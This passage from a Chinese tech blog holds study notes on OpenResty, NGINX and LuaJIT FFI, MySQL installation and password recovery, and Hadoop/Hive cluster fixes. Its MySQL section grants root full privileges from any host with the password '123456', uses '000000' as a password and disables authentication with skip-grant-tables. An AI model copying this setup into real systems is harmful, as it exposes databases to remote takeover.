<h3 id="OpenResty-中用到的-NGINX-知识"><a href="#OpenResty-中用到的-NGINX-知识" class="headerlink" title="OpenResty 中用到的 NGINX 知识"></a>OpenResty 中用到的 NGINX 知识</h3><h4 id="NGINX-配置"><a href="#NGINX-配置" class="headerlink" title="NGINX 配置"></a>NGINX 配置</h4><p>NGINX 通过配置文件来控制自身行为，它的配置可以看作是一个简单的 DSL。NGINX 在进程启动的时候读取配置，并加载到内存中。如果修改了配置文件，需要你重启或者重载 NGINX，再次读取后才能生效。</p>
<p>NGINX 支持的功能，OpenResty 并不一定支持，需要看 OpenResty 的版本号。</p>
<h4 id="MASTER-WORKER-模式"><a href="#MASTER-WORKER-模式" class="headerlink" title="MASTER-WORKER 模式"></a>MASTER-WORKER 模式</h4><p><img data-src="https://static001.geekbang.org/resource/image/a7/92/a7304c2c8af0e1e6c54819c97611b992.jpg" alt></p>
<h4 id="执行阶段"><a href="#执行阶段" class="headerlink" title="执行阶段"></a>执行阶段</h4><p>执行阶段也是 NGINX 重要的特性，与 OpenResty 的具体实现密切相关。NGINX 有 11 个执行阶段．</p>
<p><img data-src="https://static001.geekbang.org/resource/image/2a/73/2a05cb2a679bd1c81b44508666e70273.png" alt></p>
<h4 id="二进制热升级"><a href="#二进制热升级" class="headerlink" title="二进制热升级"></a>二进制热升级</h4><p>热升级通过向旧的 Master 进程发送 USR2 和 WINCH 信号量来完成。对于这两步，前者的作用，是启动新的 Master 进程；后者的作用，是逐步关闭 Worker 进程。</p>
<p>执行完这两步后，新的 Master 和新的 Worker 就已经启动了。不过此时，旧的 Master 并没有退出。不退出的原因也很简单，如果你需要回退，依旧可以给旧的 Master 发送 HUP 信号量。当然，如果你已经确定不需要回退，就可以给旧 Master 发送 KILL 信号量来退出。</p>
<h4 id="NGINX-官方文档"><a href="#NGINX-官方文档" class="headerlink" title="NGINX 官方文档"></a>NGINX 官方文档</h4><p><a href="http://nginx.org/en/docs/control.html#upgrade" target="_blank" rel="noopener">官方文档</a></p>
<p><a href="https://openresty.net.cn/agentzh-nginx-guide.html" target="_blank" rel="noopener">OpenResty 的作者 NGINX 教程</a></p>
<h2 id="管理第三方包工具"><a href="#管理第三方包工具" class="headerlink" title="管理第三方包工具"></a>管理第三方包工具</h2><h3 id="OPM"><a href="#OPM" class="headerlink" title="OPM"></a>OPM</h3><p>OpenResty 自带的包管理器<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">opm search ‘包名’</span><br><span class="line"></span><br><span class="line">返回：</span><br><span class="line">GitHub ID / repo name</span><br></pre></td></tr></table></figure></p>
<p><a href="https://opm.openresty.org/" target="_blank" rel="noopener">OPM 官网</a></p>
<h3 id="LUAROCKS"><a href="#LUAROCKS" class="headerlink" title="LUAROCKS"></a>LUAROCKS</h3><p><a href="https://luarocks.org/" target="_blank" rel="noopener">LuaRocks 官网</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">luarocks search &quot;包名&quot;</span><br></pre></td></tr></table></figure></p>
<p>我们可以到 LuaRocks 的网站上，去查看这个包的详细信息，这里面包含了作者、License、GitHub 地址、下载次数、功能简介、历史版本、依赖等。和 OPM 不同的是，LuaRocks 并没有直接使用 GitHub 的用户信息，而是需要开发者单独在 LuaRocks 上进行注册。</p>
<h4 id="开源的-API-网关项目-Kong"><a href="#开源的-API-网关项目-Kong" class="headerlink" title="开源的 API 网关项目 Kong"></a>开源的 API 网关项目 Kong</h4><p><a href="https://github.com/Kong/kong" target="_blank" rel="noopener">Kong 项目地址</a></p>
<h3 id="AWESOME-RESTY"><a href="#AWESOME-RESTY" class="headerlink" title="AWESOME-RESTY"></a>AWESOME-RESTY</h3><p>OPM 和 LuaRocks 都不支持私有包。</p>
<p><a href="https://github.com/bungle/awesome-resty" target="_blank" rel="noopener">AWESOME-RESTY 项目地址</a></p>
<h4 id="库-以及一些-项目"><a href="#库-以及一些-项目" class="headerlink" title="库 以及一些　项目"></a>库 以及一些　项目</h4><p><a href="https://github.com/tokers/lua-resty-requests" target="_blank" rel="noopener">  lua-resty-requests </a></p>
<p>它是人类更友好的 HTTP 访问库，接口风格与 Python 中大名鼎鼎的 Requests 一致。</p>
<p><a href="https://2.python-requests.org//en/master/" target="_blank" rel="noopener"> python-requests</a></p>
<p><a href="https://github.com/openresty/openresty.org" target="_blank" rel="noopener">OpenResty 的官方网站项目:　openresty.org</a></p>
<p><a href="https://github.com/openresty/stapxx" target="_blank" rel="noopener">基于 systemtap 的扩展</a></p>
<p><a href="https://github.com/openresty/openresty-gdb-utils" target="_blank" rel="noopener"> GDB 的工具集</a></p>
<h5 id="简单的-API-ngx-base64-decode"><a href="#简单的-API-ngx-base64-decode" class="headerlink" title="简单的 API - ngx.base64_decode"></a>简单的 API - ngx.base64_decode</h5><p><a href="https://github.com/openresty/lua-nginx-module#ngxdecode_base64" target="_blank" rel="noopener">lua-resty-core</a></p>
<p>在 Lua 中，你可以用 Lua C API 来调用 C 函数，而在 LuaJIT 中还可以使用 FFI。对 OpenResty 而言：</p>
<p>在核心的 lua-nginx-module 中，调用 C 函数的 API，都是使用 Lua C API 来完成的；<br>而在 lua-resty-core 中，则是把 lua-nginx-module 已有的部分 API，使用 FFI 的模式重新实现了一遍。</p>
<h6 id="Lua-CFunction"><a href="#Lua-CFunction" class="headerlink" title="Lua CFunction"></a>Lua CFunction</h6><p>能够被 Lua 调用的 C 函数来说，它的接口必须遵循 Lua 要求的形式，也就是 typedef int (<em>lua_CFunction)(lua_State</em> L)。</p>
<p>它包含的参数是 lua_State 类型的指针 L ；它的返回值类型是一个整型，表示返回值的数量，而非返回值自身。</p>
<p>for example:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static int</span><br><span class="line"> ngx_http_lua_ngx_decode_base64(lua_State *L)</span><br><span class="line"> &#123;</span><br><span class="line">     ngx_str_t p, src;</span><br><span class="line"> </span><br><span class="line">    src.data = (u_char *) luaL_checklstring(L, 1, &amp;src.len);</span><br><span class="line"> </span><br><span class="line">     p.len = ngx_base64_decoded_length(src.len);</span><br><span class="line"> </span><br><span class="line">     p.data = lua_newuserdata(L, p.len);</span><br><span class="line"> </span><br><span class="line">     if (ngx_decode_base64(&amp;p, &amp;src) == NGX_OK) &#123;</span><br><span class="line">         lua_pushlstring(L, (char *) p.data, p.len);</span><br><span class="line"> </span><br><span class="line">     &#125; else &#123;</span><br><span class="line">         lua_pushnil(L);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     return 1;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
<h6 id="LuaJIT-FFI"><a href="#LuaJIT-FFI" class="headerlink" title="LuaJIT FFI"></a>LuaJIT FFI</h6><p>FFI 的交互部分是用 Lua 实现的，这部分代码可以被 JIT 跟踪到，并进行优化;<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ngx.decode_base64 = function (s)</span><br><span class="line">     local slen = #s</span><br><span class="line">     local dlen = base64_decoded_length(slen)</span><br><span class="line">     </span><br><span class="line">     local dst = get_string_buf(dlen)</span><br><span class="line">     local pdlen = get_size_ptr()</span><br><span class="line">     local ok = C.ngx_http_lua_ffi_decode_base64(s, slen, dst, pdlen)</span><br><span class="line">     if ok == 0 then</span><br><span class="line">         return nil</span><br><span class="line">     end</span><br><span class="line">     return ffi_string(dst, pdlen[0])</span><br><span class="line"> end</span><br><span class="line"></span><br><span class="line">ngx_http_lua_ffi_ ，是用 FFI 来处理 NGINX http 请求的 Lua 函数；</span><br><span class="line">ngx_http_lua_ngx_ ，是用 Cfunction 来处理 NGINX http 请求的 Lua 函数；</span><br><span class="line">其他 ngx_ 和 lua_ 开头的函数，则分别属于 NGINX 和 Lua 的内置函数。</span><br></pre></td></tr></table></figure></p>
<p><a href="https://openresty.org/cn/c-coding-style-guide.html" target="_blank" rel="noopener">OpenResty® C 代码风格指南</a>:对于有意学习 OpenResty 的 C 代码并提交 PR 的开发者来说，这是必备的一篇文档。</p>
<p><a href="http://luajit.org/ext_ffi_tutorial.html" target="_blank" rel="noopener">LuaJIT 官方的教程</a></p>
<p><a href="http://luajit.org/ext_ffi_api.html" target="_blank" rel="noopener"> LuaJIT 文档</a></p>
<h6 id="LuaJIT-FFI-GC"><a href="#LuaJIT-FFI-GC" class="headerlink" title="LuaJIT FFI GC"></a>LuaJIT FFI GC</h6><p>LuaJIT 只负责由自己分配的资源；而 ffi.C 是 C 库的命名空间，所以，使用 ffi.C 分配的空间不由 LuaJIT 负责，需要你自己手动释放。</p>
<p>如果要在 OpenResty 中申请大块的内存，我更推荐你用 ffi.C.malloc 而不是 ffi.new。原因也很明显：</p>
<ul>
<li>ffi.new 返回的是一个 cdata，这部分内存由 LuaJIT 管理；</li>
<li>LuaJIT GC 的管理内存是有上限的，OpenResty 中的 LuaJIT 并未开启 GC64 选项，所以单个 worker 内存的上限只有 2G。一旦超过 LuaJIT 的内存管理上限，就会导致报错。</li>
</ul>
<p>在使用 FFI 的时候，我们还需要特别注意内存泄漏的问题。周边测试和调试工具.</p>
<h6 id="lua-resty-core"><a href="#lua-resty-core" class="headerlink" title="lua-resty-core"></a>lua-resty-core</h6><p>现在新的 API，都通过 FFI 的方式，在 lua-resty-core 仓库中实现。</p>
<h2 id="LuaJIT分支和标准Lua"><a href="#LuaJIT分支和标准Lua" class="headerlink" title="LuaJIT分支和标准Lua"></a>LuaJIT分支和标准Lua</h2><p> LuaJIT 在 OpenResty 整体架构中的位置：</p>
<p> <img data-src="https://static001.geekbang.org/resource/image/cd/ef/cdef970a60810548b9c297e6959671ef.png" alt></p>
<h3 id="标准-Lua-和-LuaJIT-的关系"><a href="#标准-Lua-和-LuaJIT-的关系" class="headerlink" title="标准 Lua 和 LuaJIT 的关系"></a>标准 Lua 和 LuaJIT 的关系</h3><p>标准 Lua 和 LuaJIT 是两回事儿，LuaJIT 只是兼容了 Lua 5.1 的语法。</p>
<h3 id="LuaJIT-的性能优势"><a href="#LuaJIT-的性能优势" class="headerlink" title="LuaJIT 的性能优势"></a>LuaJIT 的性能优势</h3><p>标准 Lua 出于性能考虑，也内置了虚拟机，所以 Lua 代码并不是直接被解释执行的，而是先由 Lua 编译器编译为字节码（Byte Code），然后再由 Lua 虚拟机执行。</p>
<p>LuaJIT 的运行时环境，除了一个汇编实现的 Lua 解释器外，还有一个可以直接生成机器代码的 JIT 编译器。开始的时候，LuaJIT 和标准 Lua 一样，Lua 代码被编译为字节码，字节码被 LuaJIT 的解释器解释执行。</p>
<p><strong>所谓 LuaJIT 的性能优化，本质上就是让尽可能多的 Lua 代码可以被 JIT 编译器生成机器码，而不是回退到 Lua 解释器的解释执行模式。</strong></p>
]]></content>
      <categories>
        <category>OpenResty</category>
      </categories>
      <tags>
        <tag>Lua</tag>
        <tag>OpenResty</tag>
        <tag>Nignx</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql学习笔记</title>
    <url>/Mysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><h3 id="win安装"><a href="#win安装" class="headerlink" title="win安装"></a>win安装</h3><p>以管理员身份打开 cmd 命令行工具，切换目录：</p>
<pre><code>cd C:\web\mysql-8.0.11\bin</code></pre>
初始化数据库：

<pre><code>mysqld --initialize --console</code></pre>
执行完成后，会输出 root 用户的初始默认密码，如：
<a id="more"></a>
<pre><code>
...
2018-04-20T02:35:05.464644Z 5 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: APWCY5ws&hjQ
...
</code></pre>
APWCY5ws&hjQ 就是初始密码，后续登录需要用到，你也可以在登陆后修改密码。

输入以下安装命令：

<pre><code>mysqld install</code></pre>
启动输入以下命令即可：

<pre><code>net start mysql</code></pre>

<h3 id="登录-MySQL"><a href="#登录-MySQL" class="headerlink" title="登录 MySQL"></a>登录 MySQL</h3><p>当 MySQL 服务已经运行时, 我们可以通过 MySQL 自带的客户端工具登录到 MySQL 数据库中, 首先打开命令提示符, 输入以下格式的命名:</p>
<pre><code>mysql -h 主机名 -u 用户名 -p</code></pre>

<p>参数说明：</p>
<p>-h : 指定客户端所要登录的 MySQL 主机名, 登录本机(localhost 或 127.0.0。1)该参数可以省略;<br>-u : 登录的用户名;<br>-p : 告诉服务器将会使用一个密码来登录, 如果所要登录的用户名密码为空, 可以忽略此选项。<br>如果我们要登录本机的 MySQL 数据库，只需要输入以下命令即可：</p>
<pre><code>mysql -u root -p</code></pre>
按回车确认, 如果安装正确且 MySQL 正在运行, 会得到以下响应:

<pre><code>Enter password:</code></pre>
若密码存在, 输入密码登录, 不存在则直接按回车登录。登录成功后你将会看到 Welecome to the MySQL monitor... 的提示语。

然后命令提示符会一直以 mysq> 加一个闪烁的光标等待命令的输入, 输入 exit 或 quit 退出登录。

## 填坑

### ERROR 1045 (28000): Access denied for user 'ODBC'@'localhost' (using password: NO)，MySQL8.0忘记密码并修改

ERROR 1045 (28000): Access denied for user 'ODBC'@'localhost' (using password: NO)

（先将MySQL服务停掉）

1、在MySQL的bin目录下执行mysqld --skip-grant-tables，失效，仍然不能登录MySQL

发现在8.0后这个mysqld --skip-grant-tables跳过mysql的用户验证已经失效

在8.0后变为了在bin目录下执行
<pre><code>mysqld --console --skip-grant-tables --shared-memory</code></pre>
跳过权限验证

2、另开一个cmd窗口，到bin下面执行mysql进入无密码登录页面

3、执行 
<pre><code>use mysql</code></pre>

<p>4、执行<pre><code>show tables;</code></pre>(分号不能丢),可以看到你需要账号的密码的各个表</p>
<p>5、执行修改密码操作：</p>
<pre><code>ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '你的密码';</code></pre>

<p>6、然后执行flush privileges;就好了</p>
<p>如果在修改密码的时候出现错误，如：The MySQL server is running with the –skip-grant-tables option so it cannot execute this statement</p>
<p>先执行<pre><code>flush privileges;</code></pre>再执行修改密码的语句，再执行<pre><code>flush privileges;</code></pre></p>
<h3 id="Linux下mysql登录出错"><a href="#Linux下mysql登录出错" class="headerlink" title="Linux下mysql登录出错"></a>Linux下mysql登录出错</h3><p><strong>重置密码解决MySQL for Linux错误 ERROR 1045 (28000): Access denied for user ‘root‘@’localhost’ (using password: YES)</strong></p>
<p>1.跳过密码验证进入mysql</p>
<p><code>sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf</code><br>or<br><code>vim /etc/my.cnf(注：windows下修改的是my.ini)</code></p>
<p>2、找到[mysqld]这一块代码，在后面加上skip-grant-tables，如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">#</span><br><span class="line"># * Basic Settings</span><br><span class="line">#</span><br><span class="line">user            = mysql</span><br><span class="line">pid-file        = /var/run/mysqld/mysqld.pid</span><br><span class="line">socket          = /var/run/mysqld/mysqld.sock</span><br><span class="line">port            = 3306</span><br><span class="line">basedir         = /usr</span><br><span class="line">datadir         = /var/lib/mysql</span><br><span class="line">tmpdir          = /tmp</span><br><span class="line">lc-messages-dir = /usr/share/mysql</span><br><span class="line">character_set_server=utf8</span><br><span class="line"></span><br><span class="line">skip-external-locking</span><br><span class="line"></span><br><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure></p>
<p>3、保存后重启mysql</p>
<p><code>service mysql restart</code></p>
<p>4、接着输入</p>
<p>mysql</p>
<p>5、输入”show databases;”查看数据库<br>在mysql数据库有一个user表，存储的是数据库用户的信息，我们需要修改的里面用户的密码；</p>
<p>6、输入use mysql;<br>是要使用mysql数据库的意思</p>
<p>7、输入<br><code>update user set authentication_string=password(&quot;yourNewPassword&quot;) where User=&#39;root&#39;;</code><br>（数据库账号密码更新语句）</p>
<p>注意：<br>执行后报错 ERROR 1054(42S22) Unknown column ‘password’ in ‘field list’</p>
<p>错误的原因是 5.7版本下的mysql数据库下已经没有password这个字段了，password字段改成了authentication_string</p>
<p><code>update mysql.user set authentication_string=password(&#39;*******&#39;) where user=&#39;*******&#39;;</code>  #修改密码成功</p>
<p><code>flush privileges;</code>  #立即生效</p>
<p>8、回到第一步，将密码输入跳过设置删除</p>
<p>找到[mysqld]这一块代码，删除第一步加入的skip-grant-tables。</p>
<p>9、保存后就可以输入<br><code>service mysql restart</code><br>重启mysql.</p>
<p>接着输入<br><code>mysql -u root -p</code><br>回车输入密码就不会在出错了。</p>
<h3 id="RROR-2002-HY000-Can’t-connect-to-local-MySQL-server-through-socket-‘-var-run-mysqld-mysqld-sock’"><a href="#RROR-2002-HY000-Can’t-connect-to-local-MySQL-server-through-socket-‘-var-run-mysqld-mysqld-sock’" class="headerlink" title="RROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/var/run/mysqld/mysqld.sock’"></a>RROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/var/run/mysqld/mysqld.sock’</h3><p>网上很多人回答是权限的问题，这确实后一部分，但是有些问题就像我这种明显就是搞错了软件没有安装完全导致无法使用。</p>
<h4 id="mysql和mariaDB的区别"><a href="#mysql和mariaDB的区别" class="headerlink" title="mysql和mariaDB的区别"></a>mysql和mariaDB的区别</h4><p>这里首先要了解清楚mysql和mariaDB的区别，你的机器装的到底是哪一个版本，现在的centos默认是mariaDB，以前是mysql。关于这两者的区别就是：mariaDB是mysql源代码的一个分支，现在mariaDB 现在是很多开源系统默认的 mysql 实现。mariaDB 基本上和 mysql 差不多，对使用者来说基本都是一样的。</p>
<p>centos可以通过</p>
<p>rpm -qa|grep mysql 查看有没有安装mysql<br>rpm -qa|grep maria 查看有没有安装mariaDB<br>具体看你要安装哪种 ，不要两种混装，这样会导致问题的。</p>
<h4 id="安装mariaDB"><a href="#安装mariaDB" class="headerlink" title="安装mariaDB"></a>安装mariaDB</h4><p>可以直接通过yum源来安装，默认安装的就是mysql</p>
<p>yum -y install mysql<br>yum -y install mariadb-server<br>mysql_secure_installation 设置 root密码等相关<br>第二步没安装的的话，会报错的，即ERROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/var/lib/mysql/mysql.sock’ </p>
<h4 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h4><p>在安装mysql之前请把所有的关于mariaDB的东西删除干净，然后去官网下载rpm包（centos默认的yum源已经没有mysql的安装包了，你可以通过yum list |grep mysql，看到没有mysql-server这个安装包）或者下述的方法安装。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -qa|grep maria 找出所有关于mariaDB的安装包</span><br><span class="line">yum remove -y maria* 在后面加上上面的包名删除</span><br><span class="line">wget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm这里是获取yum源，因为官方的没有我们要下载一个，这个源是mysql官网提供的</span><br><span class="line">sudo rpm -ivh mysql-community-release-el7-5.noarch.rpm 安装，安装这个包后，会获得两个mysql的yum repo源：/etc/yum.repos.d/mysql-community.repo，/etc/yum.repos.d/mysql-community-source.repo.</span><br><span class="line">sudo yum install mysql-server</span><br><span class="line">systemctl start mysql 启动mysql服务</span><br><span class="line">systemctl enable mysql 设置mysql开机启动</span><br><span class="line">mysql -u root -p（刚进去是没有密码的直接回车）</span><br><span class="line">update user set password=PASSWORD（’passwd’） where User=’root’;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure></p>
<p>五、关于目录<br>其实这些都是定义在/etc/my.cnf文件中，里面有默认的定义。出现问题首先应该看日志的错误输出。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. mysql数据库的data目录 /var/lib/mysql/</span><br><span class="line">2. mysql头文件：/usr/include/mysql/</span><br><span class="line">3. mysql可执行文件： /usr/bin/</span><br><span class="line">4. mysql库文件：/usr/lib64/mysql</span><br><span class="line">3. mysql日志文件：/var/log/mysqld.log</span><br></pre></td></tr></table></figure></p>
<h4 id="远程登陆"><a href="#远程登陆" class="headerlink" title="远程登陆"></a>远程登陆</h4><p>关于无法远程登陆的问题可以直接改表：<br><code>GRANT ALL PRIVILEGES ON . TO ‘root’@’%’ IDENTIFIED BY ‘123456’ WITH GRANT OPTION;</code></p>
<h4 id="MySql中user表中主机配置"><a href="#MySql中user表中主机配置" class="headerlink" title="MySql中user表中主机配置"></a>MySql中user表中主机配置</h4><p>配置只要是root用户+密码，在任何主机上都能登录MySQL数据库。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1．进入mysql</span><br><span class="line">[root@hadoop102 mysql-libs]# mysql -uroot -p000000</span><br><span class="line">2．显示数据库</span><br><span class="line">mysql&gt;show databases;</span><br><span class="line">2.1修改密码</span><br><span class="line">mysql&gt;SET PASSWORD=PASSWORD(&apos;000000&apos;);</span><br><span class="line">3．使用mysql数据库</span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line">4．展示mysql数据库中的所有表</span><br><span class="line">mysql&gt;show tables;</span><br><span class="line">5．展示user表的结构</span><br><span class="line">mysql&gt;desc user;</span><br><span class="line">6．查询user表</span><br><span class="line">mysql&gt;select User, Host, Password from user;</span><br><span class="line">7．修改user表，把Host表内容修改为%</span><br><span class="line">mysql&gt;update user set host=&apos;%&apos; where host=&apos;localhost&apos;;</span><br><span class="line">8．删除root用户的其他host</span><br><span class="line">mysql&gt;delete from user where Host=&apos;hadoop1&apos;;</span><br><span class="line">mysql&gt;delete from user where Host=&apos;127.0.0.1&apos;;</span><br><span class="line">mysql&gt;delete from user where Host=&apos;::1&apos;;</span><br><span class="line">9．刷新</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">10．退出</span><br><span class="line">mysql&gt;quit;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>java-大数据-数仓</title>
    <url>/java-%E5%A4%A7%E6%95%B0%E6%8D%AE-%E6%95%B0%E4%BB%93/</url>
    <content><![CDATA[<h2 id="数据仓库简介"><a href="#数据仓库简介" class="headerlink" title="数据仓库简介"></a>数据仓库简介</h2><h3 id="什么是数据仓库"><a href="#什么是数据仓库" class="headerlink" title="什么是数据仓库"></a>什么是数据仓库</h3><p>数据仓库，是为企业所有级别的决策制定过程，提供所有类型数据支持的战略集合。它出于分析性报告和决策支持目的而创建。<br>为需要业务智能的企业，提供指导业务流程改进、监视时间、成本、质量以及控制。</p>
<h3 id="数据仓库的特点"><a href="#数据仓库的特点" class="headerlink" title="数据仓库的特点"></a>数据仓库的特点</h3><h4 id="数据仓库的数据是面向主题的"><a href="#数据仓库的数据是面向主题的" class="headerlink" title="数据仓库的数据是面向主题的"></a>数据仓库的数据是面向主题的</h4><p>主题是一个抽象的概念，是较高层次上企业信息系统中的数据综合、归类并进行分析利用的抽象。在逻辑意义上，它是对应企业中某一宏观分析领域所涉及的分析对象。<br><a id="more"></a><br>数据集市，数据展示、报表</p>
<h4 id="数据仓库的数据是集成的"><a href="#数据仓库的数据是集成的" class="headerlink" title="数据仓库的数据是集成的"></a>数据仓库的数据是集成的</h4><p>数据仓库的数据是从原有的分散的数据库数据抽取来的。<br>1、数据仓库   抽取转换加载（ETL），就是需要现数据标准化，单位统一、字长一致、异名同义。<br>2、T + 1 与 T - 1 的数据什么意思。一个是实时的，一个是分区的。<br>3、 </p>
<h4 id="数据仓库的数据是不可更新的"><a href="#数据仓库的数据是不可更新的" class="headerlink" title="数据仓库的数据是不可更新的"></a>数据仓库的数据是不可更新的</h4><h4 id="数据仓库的数据是随时间不断变化的"><a href="#数据仓库的数据是随时间不断变化的" class="headerlink" title="数据仓库的数据是随时间不断变化的"></a>数据仓库的数据是随时间不断变化的</h4><h2 id="集群搭建问题总结"><a href="#集群搭建问题总结" class="headerlink" title="集群搭建问题总结"></a>集群搭建问题总结</h2><p>1、Namenode 部分节点缺失</p>
<p>疑似原因一： 主机 ip 变化导致之前的date有问题，删除重新进行格式化，持怀疑态度？  误区  不是！<br>            每次 namenode format 会重新创建一个 namenodeId, 而 data 目录包含了上次 format 时的 id,namenode format 清空了 namenode 下的数据 , 但是没有清空 datanode 下的数据 , 导致启动时失败 , 所要做的就是每次 fotmat 前 , 清空 data 下的所有目录 .<br>解决方法：   停掉集群，删除问题节点的data目录下的所有内容。即hdfs-site.xml文件中配置的dfs.data.dir目录。重新格式化namenode。<br>            先停掉集群，然后将datanode节点目录/dfs/data/current/VERSION中的修改为与namenode一致即可。<br>疑似原因二： core-seting 配置文件缺少部分参数，比如最小内存以及Cpu个数</p>
<p>2、hadoop启动没有nodemanager</p>
<p>问题：发现如下错误：FATAL org.apache.hadoop.yarn.server.nodemanager.NodeManager: Error starting NodeManager org.apache.hadoop.yarn.exceptions.YarnRuntimeException: org.apache.hadoop.yarn.exceptions.YarnRuntimeException: Recieved SHUTDOWN signal from Resourcemanager ,Registration of NodeManager failed, Message from ResourceManager: NodeManager </p>
<p>from  hadoop22 doesn’t satisfy minimum allocations, Sending SHUTDOWN signal to theNodeManager.其实就是yarn-site.xml配置有点问题。nodemanager要求的内存最低1024MB</p>
<p>解决方法：更改yarn-site.xml的配置文件（如下）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.nodemanager.resource.memory-mb&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;1024&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.nodemanager.resource.cpu-vcores&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;1&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure></p>
<p>3、免密登陆最简单方式</p>
<p>通过ssh-copy-id的方式</p>
<p><code>命令： ssh-copy-id -i ~/.ssh/id_rsa.put &lt;romte_ip&gt;</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">authorized_keys:存放远程免密登录的公钥,主要通过这个文件记录多台机器的公钥</span><br><span class="line"></span><br><span class="line">　　id_rsa : 生成的私钥文件</span><br><span class="line"></span><br><span class="line">　　id_rsa.pub ： 生成的公钥文件</span><br><span class="line"></span><br><span class="line">　　know_hosts : 已知的主机公钥清单</span><br><span class="line"></span><br><span class="line">　　如果希望ssh公钥生效需满足至少下面两个条件：</span><br><span class="line"></span><br><span class="line">　　1) .ssh目录的权限必须是700</span><br><span class="line"></span><br><span class="line">　　2) .ssh/authorized_keys文件权限必须是600</span><br></pre></td></tr></table></figure></p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20201025/T6BfYxsYtRYX.png" alt="mark"></p>
<p>4、Hive SQL任务执行报错 (Container killed on request. Exit code is 143)</p>
<ul>
<li>错误描述</li>
</ul>
<p>执行 hive 任务报错<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Diagnostic Messages for this Task:</span><br><span class="line">Container [pid=27756,containerID=container_1460459369308_5864_01_000570] is running beyond physical memory limits. Current usage: 4.2 GB of 4 GB physical memory used; 5.0 GB of 16.8 GB virtual memory used. Killing container.</span><br><span class="line">Container killed on request. Exit code is 143</span><br><span class="line">Container exited with a non-zero exit code 143</span><br></pre></td></tr></table></figure></p>
<ul>
<li>Hive 任务执行时设置的参数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看关于 container 内存的配置:</span><br><span class="line"></span><br><span class="line">hive (default)&gt; SET mapreduce.map.memory.mb;</span><br><span class="line">mapreduce.map.memory.mb=4096</span><br><span class="line">hive (default)&gt; SET mapreduce.reduce.memory.mb;</span><br><span class="line">mapreduce.reduce.memory.mb=4096</span><br><span class="line">hive (default)&gt; SET yarn.nodemanager.vmem-pmem-ratio;</span><br><span class="line">yarn.nodemanager.vmem-pmem-ratio=4.2</span><br><span class="line"></span><br><span class="line">注:</span><br><span class="line">yarn.nodemanager.vmem-pmem-ratio: 虚拟内存率，默认2.1</span><br></pre></td></tr></table></figure>
<ul>
<li>错误分析</li>
</ul>
<p>从 hive 报错看是由于物理内存达到限制，导致 container 被 kill 掉报错。<br>看日志的末端，看出现报错是属于哪一个阶段，是map task阶段或者reduce task阶段，是哪一阶段的内存不足导致的问题。</p>
<ul>
<li>结论</li>
</ul>
<p>从上面执行时候配置的参数看，单个map 和 reduce 分配物理内存 4G; 虚拟内存限制 4 * 4.2 = 16.8G 。<br>所以从上面的报错信息来看，是由于单个 task (map task 或 reduce task) 处理的数据量超过物理内存 4G 限制导致的，所以设置mapreduce.map.memory.mb = 8092 或者 mapreduce.reduce.memory.mb = 8092 即可解决该问题。</p>
<ul>
<li>解决方法：</li>
</ul>
<p>方案一：mapred-site.xml中设置map和reduce任务的内存配置如下：(value中实际配置的内存需要根据自己机器内存大小及应用情况进行修改)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">　　&lt;name&gt;mapreduce.map.memory.mb&lt;/name&gt;</span><br><span class="line">　　&lt;value&gt;1536&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">　　&lt;name&gt;mapreduce.map.java.opts&lt;/name&gt;</span><br><span class="line">　　&lt;value&gt;-Xmx1024M&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">　　&lt;name&gt;mapreduce.reduce.memory.mb&lt;/name&gt;</span><br><span class="line">　　&lt;value&gt;3072&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">　　&lt;name&gt;mapreduce.reduce.java.opts&lt;/name&gt;</span><br><span class="line">　　&lt;value&gt;-Xmx2560M&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure></p>
